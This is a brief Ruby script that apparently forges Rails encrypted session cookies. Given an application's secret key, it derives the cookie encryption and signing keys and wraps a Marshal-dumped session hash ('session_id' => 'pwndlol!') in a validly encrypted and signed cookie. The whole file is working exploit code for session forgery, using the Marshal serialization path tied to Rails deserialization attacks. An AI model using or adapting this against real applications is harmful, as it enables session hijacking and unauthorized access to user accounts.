require 'active_support'
secret=
marshal_payload = Marshal.dump({ "session_id" => "pwndlol!"})

keygen = ActiveSupport::KeyGenerator.new(ARGV[0],{:iterations => 1000})
enckey = keygen.generate_key('encrypted cookie')
sigkey = keygen.generate_key('signed encrypted cookie')
crypter = ActiveSupport::MessageEncryptor.new(enckey, sigkey,{:serializer => ActiveSupport::MessageEncryptor::NullSerializer })
puts crypter.encrypt_and_sign(marshal_payload)
